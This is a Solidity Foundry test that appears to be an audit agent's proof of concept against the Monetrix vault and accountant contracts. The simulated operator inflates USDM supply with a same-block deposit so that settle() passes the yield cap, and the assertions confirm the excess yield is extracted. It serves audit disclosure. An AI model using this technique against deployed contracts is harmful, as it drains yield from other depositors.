// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/simulator/SimulatorBase.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixVault.sol";
import "../src/tokens/USDM.sol";

// ATTACK TIMELINE:
// 1. [Setup] Initialize simulator, fetch current organic USDM supply and max annual yield bps.
// 2. [T=0] Calculate the strict APR cap based on the organic supply.
// 3. [T=0] Attacker (operator) deposits a massive amount of USDC to mint USDM, inflating totalSupply() by 10x in the same block.
// 4. [T=0] Attacker calls vault.settle() with a proposedYield that exceeds the organic cap but passes the newly inflated Gate 4 cap.
// 5. [Assert] Verify that the accountant successfully settled the excess yield, proving the temporal ordering / TOCTOU vulnerability.

contract AuditAgentPoC is SimulatorBase {
    function test_exploit() public {
        setUpSimulator();

        // Fetch initial organic state
        uint256 organicSupply = usdm.totalSupply();
        uint256 maxBps = accountant.maxAnnualYieldBps();

        // Gate 4 computes daily cap as: (totalSupply * maxAnnualYieldBps) / (10000 * 365)
        uint256 organicDailyCap = (organicSupply * maxBps) / (10000 * 365);

        // We want to extract 5x the organic daily cap.
        // To pass Gate 4, the inflated supply must be at least 5x the organic supply.
        uint256 targetYield = organicDailyCap * 5;
        uint256 requiredInflatedSupply = organicSupply * 6; // 6x to be safe
        uint256 usdcToDeposit = requiredInflatedSupply; 

        // Ensure minSettlementInterval has elapsed so Gate 2 passes
        uint256 minInterval = accountant.minSettlementInterval();
        vm.warp(block.timestamp + minInterval + 1);

        // Fund the operator with enough USDC to inflate the supply
        deal(address(usdc), operator, usdcToDeposit);

        // Record state before attack
        uint256 totalSettledBefore = accountant.totalSettledYield();

        vm.startPrank(operator);

        // Step 1: Inflate USDM supply via deposit in the same block
        usdc.approve(address(vault), usdcToDeposit);
        vault.deposit(usdcToDeposit);

        uint256 inflatedSupply = usdm.totalSupply();
        require(inflatedSupply >= requiredInflatedSupply, "Supply not inflated enough");

        // Step 2: Settle the excess yield. 
        // This proposedYield would have reverted under the organic cap, 
        // but passes Gate 4 due to the same-block inflated totalSupply().
        vault.settle(targetYield);

        vm.stopPrank();

        // Step 3: Assert the exploit succeeded
        uint256 totalSettledAfter = accountant.totalSettledYield();
        uint256 extractedYield = totalSettledAfter - totalSettledBefore;

        assertGt(extractedYield, organicDailyCap, "Attacker extracted yield exceeding the organic APR cap");
        assertEq(extractedYield, targetYield, "Full inflated yield was not settled");
    }
}
